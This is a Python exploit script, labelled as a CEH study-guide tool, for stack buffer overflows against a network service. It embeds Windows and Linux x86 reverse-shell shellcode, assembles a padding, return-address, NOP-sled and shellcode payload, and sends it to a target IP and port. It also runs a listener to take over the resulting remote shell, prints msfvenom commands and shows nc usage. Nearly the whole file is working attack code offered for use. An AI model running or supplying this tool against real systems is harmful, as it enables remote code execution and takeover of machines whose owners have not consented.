#!/usr/bin/env python3
"""
Buffer Overflow Shellcode Exploitation Script
=============================================

This script demonstrates the final stage of buffer overflow exploitation
by sending shellcode to gain control of the target system.

Usage: python3 shellcode.py <target_ip> <target_port> [options]

Author: CEH Study Guide
Purpose: Educational - Buffer Overflow Exploitation
"""

import socket
import argparse
import sys

def generate_reverse_shell_payload(lhost, lport, arch="x86", platform="windows"):
    """
    Generate reverse shell shellcode using msfvenom
    
    Args:
        lhost (str): Local host IP for reverse connection
        lport (int): Local port for reverse connection
        arch (str): Target architecture (x86, x64)
        platform (str): Target platform (windows, linux)
    
    Returns:
        bytes: Generated shellcode
    """
    # Example Windows x86 reverse shell (generated with msfvenom)
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -b '\x00'
    
    if platform.lower() == "windows" and arch.lower() == "x86":
        # This is a sample shellcode - replace with actual generated shellcode
        shellcode = (
            b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
            b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
            b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
            b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
            b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
            b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
            b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
            b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
            b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
            b"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
            b"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
            b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
            b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x02\x01\x68"
            b"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
            b"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
            b"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
            b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
            b"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
            b"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
            b"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
            b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
            b"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
        )
    elif platform.lower() == "linux" and arch.lower() == "x86":
        # Linux x86 reverse shell
        shellcode = (
            b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
            b"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x01\x64\x68"
            b"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
            b"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
            b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
    else:
        print(f"[-] Unsupported platform/architecture: {platform}/{arch}")
        return b""
    
    # Note: In real scenarios, you would replace the IP/Port in the shellcode
    # This is just a demonstration
    return shellcode

def create_exploit_payload(offset, eip_address, shellcode, nop_sled_size=16):
    """
    Create complete exploit payload
    
    Args:
        offset (int): Offset to EIP
        eip_address (bytes): Return address (JMP ESP, etc.)
        shellcode (bytes): Shellcode to execute
        nop_sled_size (int): Size of NOP sled
    
    Returns:
        bytes: Complete exploit payload
    """
    junk = b"A" * offset
    eip = eip_address
    nop_sled = b"\x90" * nop_sled_size  # NOP instructions
    payload = junk + eip + nop_sled + shellcode
    
    return payload

def send_exploit(target_ip, target_port, payload, timeout=10):
    """
    Send exploit payload to target
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port number
        payload (bytes): Exploit payload
        timeout (int): Connection timeout
    
    Returns:
        bool: True if sent successfully
    """
    try:
        print(f"[*] Connecting to {target_ip}:{target_port}")
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(timeout)
        conn.connect((target_ip, target_port))
        
        print(f"[*] Sending exploit payload ({len(payload)} bytes)")
        conn.send(payload)
        
        # Brief delay to allow execution
        import time
        time.sleep(1)
        
        conn.close()
        return True
        
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

def start_listener(lport):
    """
    Start a simple listener for reverse shell
    
    Args:
        lport (int): Local port to listen on
    """
    try:
        print(f"[+] Starting listener on port {lport}")
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", lport))
        listener.listen(1)
        
        print(f"[*] Waiting for connection...")
        conn, addr = listener.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")
        
        # Simple shell interaction
        import threading
        import select
        
        def handle_input():
            while True:
                try:
                    cmd = input()
                    conn.send((cmd + "\n").encode())
                except:
                    break
        
        input_thread = threading.Thread(target=handle_input)
        input_thread.daemon = True
        input_thread.start()
        
        while True:
            try:
                ready, _, _ = select.select([conn], [], [], 1)
                if ready:
                    data = conn.recv(4096)
                    if data:
                        print(data.decode('latin-1'), end='')
                    else:
                        break
            except KeyboardInterrupt:
                break
            except:
                break
        
        conn.close()
        listener.close()
        
    except Exception as e:
        print(f"[-] Listener failed: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Buffer Overflow Shellcode Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic exploitation with default values
  python3 shellcode.py 192.168.1.100 9999
  
  # Custom parameters
  python3 shellcode.py 192.168.1.100 9999 --offset 1052 --eip "\\x7B\\x8A\\xA9\\x68"
  
  # Start listener for reverse shell
  python3 shellcode.py --listen 4444
  
  # Generate msfvenom command
  python3 shellcode.py --generate-msfvenom --lhost 192.168.1.100 --lport 4444
  
Workflow:
  1. Generate shellcode with msfvenom
  2. Find JMP ESP or similar instruction address
  3. Start listener (if using reverse shell)
  4. Send exploit payload
  5. Interact with shell
        """
    )
    
    parser.add_argument('target_ip', nargs='?', help='Target IP address')
    parser.add_argument('target_port', nargs='?', type=int, help='Target port number')
    parser.add_argument('--offset', type=int, default=1052,
                       help='EIP offset (default: 1052)')
    parser.add_argument('--eip', default="\\x7B\\x8A\\xA9\\x68",
                       help='EIP address in hex format (JMP ESP address)')
    parser.add_argument('--lhost', default="192.168.1.100",
                       help='Local host for reverse shell (default: 192.168.1.100)')
    parser.add_argument('--lport', type=int, default=4444,
                       help='Local port for reverse shell (default: 4444)')
    parser.add_argument('--platform', choices=['windows', 'linux'], default='windows',
                       help='Target platform (default: windows)')
    parser.add_argument('--arch', choices=['x86', 'x64'], default='x86',
                       help='Target architecture (default: x86)')
    parser.add_argument('--nop-size', type=int, default=16,
                       help='NOP sled size (default: 16)')
    parser.add_argument('--listen', type=int, metavar='PORT',
                       help='Start listener on specified port')
    parser.add_argument('--generate-msfvenom', action='store_true',
                       help='Generate msfvenom command')
    parser.add_argument('--custom-shellcode', 
                       help='Use custom shellcode (hex format)')
    
    args = parser.parse_args()
    
    # Start listener mode
    if args.listen:
        start_listener(args.listen)
        return
    
    # Generate msfvenom command
    if args.generate_msfvenom:
        if args.platform == 'windows':
            payload_type = "windows/shell_reverse_tcp"
        else:
            payload_type = "linux/x86/shell_reverse_tcp"
        
        print(f"[+] Msfvenom command for {args.platform} {args.arch}:")
        print(f"msfvenom -p {payload_type} LHOST={args.lhost} LPORT={args.lport} -f python -b '\\x00'")
        return
    
    # Validate required arguments
    if not args.target_ip or not args.target_port:
        parser.print_help()
        return
    
    # Parse EIP address
    try:
        eip_str = args.eip.replace('\\x', '')
        if len(eip_str) % 2 != 0:
            print("[-] Invalid EIP format. Use format like \\x42\\x42\\x42\\x42")
            return
        eip_bytes = bytes.fromhex(eip_str)
    except ValueError:
        print("[-] Invalid EIP address format")
        return
    
    # Generate or use custom shellcode
    if args.custom_shellcode:
        try:
            shellcode = bytes.fromhex(args.custom_shellcode.replace('\\x', ''))
        except ValueError:
            print("[-] Invalid custom shellcode format")
            return
    else:
        shellcode = generate_reverse_shell_payload(args.lhost, args.lport, 
                                                 args.arch, args.platform)
        if not shellcode:
            return
    
    # Create exploit payload
    payload = create_exploit_payload(args.offset, eip_bytes, shellcode, args.nop_size)
    
    print(f"[+] Exploit Configuration:")
    print(f"    Target: {args.target_ip}:{args.target_port}")
    print(f"    Platform: {args.platform} {args.arch}")
    print(f"    EIP Offset: {args.offset}")
    print(f"    EIP Address: {args.eip}")
    print(f"    Reverse Shell: {args.lhost}:{args.lport}")
    print(f"    Shellcode Size: {len(shellcode)} bytes")
    print(f"    Total Payload Size: {len(payload)} bytes")
    print()
    
    # Send exploit
    print(f"[*] Make sure listener is running on {args.lhost}:{args.lport}")
    print(f"[*] Example: nc -lvp {args.lport}")
    input("[*] Press Enter to send exploit...")
    
    if send_exploit(args.target_ip, args.target_port, payload):
        print(f"[+] Exploit sent successfully!")
        print(f"[*] Check your listener for incoming connection")
    else:
        print(f"[-] Exploit failed")

if __name__ == "__main__":
    main()

# Example usage:
# 1. Generate shellcode:
#    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -b '\x00'
#
# 2. Start listener:
#    nc -lvp 4444
#
# 3. Send exploit:
#    python3 shellcode.py 192.168.1.100 9999 --offset 1052 --eip "\x7B\x8A\xA9\x68"